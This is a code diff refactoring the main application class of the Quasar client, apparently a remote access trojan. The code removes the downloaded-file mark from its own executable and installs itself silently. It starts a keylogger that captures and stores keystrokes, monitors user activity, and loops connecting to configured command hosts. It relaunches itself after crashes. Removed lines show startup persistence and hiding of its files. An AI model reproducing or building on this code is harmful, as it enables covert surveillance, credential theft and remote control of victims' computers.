@@ -4,6 +4,7 @@ using Quasar.Client.Logging;
 using Quasar.Client.Messages;
 using Quasar.Client.Networking;
 using Quasar.Client.Setup;
+using Quasar.Client.User;
 using Quasar.Client.Utilities;
 using Quasar.Common.DNS;
 using Quasar.Common.Helpers;
@@ -11,70 +12,124 @@ using Quasar.Common.Messages;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
 using System.Windows.Forms;
 
 namespace Quasar.Client
 {
-    public class QuasarApplication
+    /// <summary>
+    /// The client application which handles basic bootstrapping of the message processors and background tasks.
+    /// </summary>
+    public class QuasarApplication : IDisposable
     {
+        /// <summary>
+        /// A system-wide mutex that ensures that only one instance runs at a time.
+        /// </summary>
         public SingleInstanceMutex ApplicationMutex;
+
+        /// <summary>
+        /// The client used for the connection to the server.
+        /// </summary>
         public QuasarClient ConnectClient;
+
+        /// <summary>
+        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
+        /// </summary>
         private readonly List<IMessageProcessor> _messageProcessors;
+        
+        /// <summary>
+        /// The background keylogger service used to capture and store keystrokes.
+        /// </summary>
         private KeyloggerService _keyloggerService;
 
+        /// <summary>
+        /// Keeps track of the user activity.
+        /// </summary>
+        private ActivityDetection _userActivityDetection;
+
+        /// <summary>
+        /// Determines whether an installation is required depending on the current and target paths.
+        /// </summary>
         private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;
 
+        /// <summary>
+        /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
+        /// </summary>
         public QuasarApplication()
         {
             AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
             _messageProcessors = new List<IMessageProcessor>();
         }
 
+        /// <summary>
+        /// Begins running the application.
+        /// </summary>
         public void Run()
         {
             // decrypt and verify the settings
-            if (Settings.Initialize())
+            if (!Settings.Initialize()) return;
+
+            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
+
+            // check if process with same mutex is already running on system
+            if (!ApplicationMutex.CreatedNew) return;
+
+            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
+
+            var installer = new ClientInstaller();
+
+            if (IsInstallationRequired)
             {
-                ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
+                // close mutex before installing the client
+                ApplicationMutex.Dispose();
 
-                // check if process with same mutex is already running on system
-                if (ApplicationMutex.CreatedNew)
+                try
                 {
-                    FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
-
-                    if (IsInstallationRequired)
-                    {
-                        // close mutex before installing the client
-                        ApplicationMutex.Dispose();
-                        new ClientInstaller().Install();
-                    }
-                    else
-                    {
-                        // (re)apply settings and proceed with connect loop
-                        ApplySettings();
-                        var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
-                        ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
-                        InitializeMessageProcessors(ConnectClient);
-                        ConnectClient.ConnectLoop();
-                    }
+                    installer.Install();
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e);
                 }
             }
+            else
+            {
+                try
+                {
+                    // (re)apply settings and proceed with connect loop
+                    installer.ApplySettings();
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e);
+                }
 
-            Cleanup();
-            Exit();
+                if (Settings.ENABLELOGGER)
+                {
+                    _keyloggerService = new KeyloggerService();
+                    _keyloggerService.Start();
+                }
+
+                var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
+                ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
+                InitializeMessageProcessors(ConnectClient);
+
+                _userActivityDetection = new ActivityDetection(ConnectClient);
+                _userActivityDetection.Start();
+
+                ConnectClient.ConnectLoop();
+            }
         }
 
-        private static void Exit()
-        {
-            // Don't wait for other threads
-            Environment.Exit(0);
-        }
-
+        /// <summary>
+        /// Handles unhandled exceptions by restarting the application and hoping that they don't happen again.
+        /// </summary>
+        /// <param name="sender">The source of the unhandled exception event.</param>
+        /// <param name="e">The exception event arguments. </param>
         private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
             if (e.IsTerminating)
             {
+                Debug.WriteLine(e);
                 string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
                 if (string.IsNullOrEmpty(batchFile)) return;
 
@@ -85,17 +140,14 @@ namespace Quasar.Client
                     FileName = batchFile
                 };
                 Process.Start(startInfo);
-                Exit();
+                Environment.Exit(0);
             }
         }
 
-        private void Cleanup()
-        {
-            CleanupMessageProcessors();
-            _keyloggerService?.Dispose();
-            ApplicationMutex.Dispose();
-        }
-
+        /// <summary>
+        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
+        /// </summary>
+        /// <param name="client">The client which handles the connection.</param>
         private void InitializeMessageProcessors(QuasarClient client)
         {
             _messageProcessors.Add(new ClientServicesHandler(this, client));
@@ -112,13 +164,15 @@ namespace Quasar.Client
             _messageProcessors.Add(new SystemInformationHandler());
             _messageProcessors.Add(new TaskManagerHandler(client));
             _messageProcessors.Add(new TcpConnectionsHandler(client));
-            _messageProcessors.Add(new UserStatusHandler(client));
             _messageProcessors.Add(new WebsiteVisitorHandler());
 
             foreach (var msgProc in _messageProcessors)
                 MessageHandler.Register(msgProc);
         }
 
+        /// <summary>
+        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
+        /// </summary>
         private void CleanupMessageProcessors()
         {
             foreach (var msgProc in _messageProcessors)
@@ -128,44 +182,28 @@ namespace Quasar.Client
             }
         }
 
-        private void ApplySettings()
+        /// <summary>
+        /// Releases all resources used by this <see cref="QuasarApplication"/>.
+        /// </summary>
+        public void Dispose()
         {
-            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
 
-            if (Settings.STARTUP)
+        /// <summary>
+        /// Releases all allocated message processors, services and other resources.
+        /// </summary>
+        /// <param name="disposing"><c>True</c> if called from <see cref="Dispose"/>, <c>false</c> if called from the finalizer.</param>
+        protected virtual void Dispose(bool disposing)
+        {
+            if (disposing)
             {
-                Startup.AddToStartup();
-            }
-
-            if (Settings.INSTALL && Settings.HIDEFILE)
-            {
-                try
-                {
-                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
-                }
-                catch (Exception)
-                {
-                }
-            }
-
-            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
-            {
-                try
-                {
-                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
-                    di.Attributes |= FileAttributes.Hidden;
-                }
-                catch (Exception)
-                {
-                }
-            }
-
-            if (Settings.ENABLELOGGER)
-            {
-                _keyloggerService = new KeyloggerService();
-                _keyloggerService.StartService();
+                CleanupMessageProcessors();
+                _keyloggerService?.Dispose();
+                _userActivityDetection?.Dispose();
+                ApplicationMutex.Dispose();
             }
         }
-        
     }
 }
